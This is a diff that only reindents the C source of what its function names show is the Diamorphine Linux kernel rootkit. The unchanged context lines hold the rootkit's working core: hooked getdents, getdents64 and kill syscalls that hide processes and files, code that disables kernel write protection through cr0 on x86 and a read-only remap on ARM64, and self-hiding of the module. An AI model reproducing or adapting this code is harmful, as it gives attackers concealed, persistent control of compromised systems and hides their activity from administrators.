@@ -37,7 +37,7 @@ unsigned long cr0;
 void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
 unsigned long start_rodata;
 unsigned long init_begin;
-#define section_size    init_begin - start_rodata
+#define section_size init_begin - start_rodata
 #endif
 static unsigned long *__sys_call_table;
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
@@ -106,11 +106,11 @@ is_invisible(pid_t pid)
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
-        int fd = (int) pt_regs->di;
-        struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
+	int fd = (int) pt_regs->di;
+	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
 #elif IS_ENABLED(CONFIG_ARM64)
-		int fd = (int) pt_regs->regs[0];
-        struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
+	int fd = (int) pt_regs->regs[0];
+	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
 #endif
 	int ret = orig_getdents64(pt_regs), err;
 #else
@@ -172,11 +172,11 @@ out:
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 static asmlinkage long hacked_getdents(const struct pt_regs *pt_regs) {
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
-        int fd = (int) pt_regs->di;
-        struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
+	int fd = (int) pt_regs->di;
+	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
 #elif IS_ENABLED(CONFIG_ARM64)
 		int fd = (int) pt_regs->regs[0];
-        struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
+	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
 #endif
 	int ret = orig_getdents(pt_regs), err;
 #else
@@ -306,11 +306,11 @@ asmlinkage int
 hacked_kill(const struct pt_regs *pt_regs)
 {
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
-        pid_t pid = (pid_t) pt_regs->di;
-        int sig = (int) pt_regs->si;
+	pid_t pid = (pid_t) pt_regs->di;
+	int sig = (int) pt_regs->si;
 #elif IS_ENABLED(CONFIG_ARM64)
-        pid_t pid = (pid_t) pt_regs->regs[0];
-        int sig = (int) pt_regs->regs[1];
+	pid_t pid = (pid_t) pt_regs->regs[0];
+	int sig = (int) pt_regs->regs[1];
 #endif
 #else
 asmlinkage int
@@ -345,12 +345,12 @@ hacked_kill(pid_t pid, int sig)
 static inline void
 write_cr0_forced(unsigned long val)
 {
-    unsigned long __force_order;
+	unsigned long __force_order;
 
-    /* __asm__ __volatile__( */
-    asm volatile(
-        "mov %0, %%cr0"
-        : "+r"(val), "+m"(__force_order));
+	/* __asm__ __volatile__( */
+	asm volatile(
+		"mov %0, %%cr0"
+		: "+r"(val), "+m"(__force_order));
 }
 #endif
 
@@ -364,8 +364,8 @@ protect_memory(void)
 	write_cr0(cr0);
 #endif
 #elif IS_ENABLED(CONFIG_ARM64)
-    update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
-			    section_size, PAGE_KERNEL_RO);
+	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
+			section_size, PAGE_KERNEL_RO);
 
 #endif
 }
@@ -380,8 +380,8 @@ unprotect_memory(void)
 	write_cr0(cr0 & ~0x00010000);
 #endif
 #elif IS_ENABLED(CONFIG_ARM64)
-    update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
-			    section_size, PAGE_KERNEL);
+	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
+			section_size, PAGE_KERNEL);
 #endif
 }
 
@@ -395,9 +395,9 @@ diamorphine_init(void)
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 	cr0 = read_cr0();
 #elif IS_ENABLED(CONFIG_ARM64)
-    update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot");
-    start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
-    init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");
+	update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot");
+	start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
+	init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");
 #endif
 
 	module_hide();
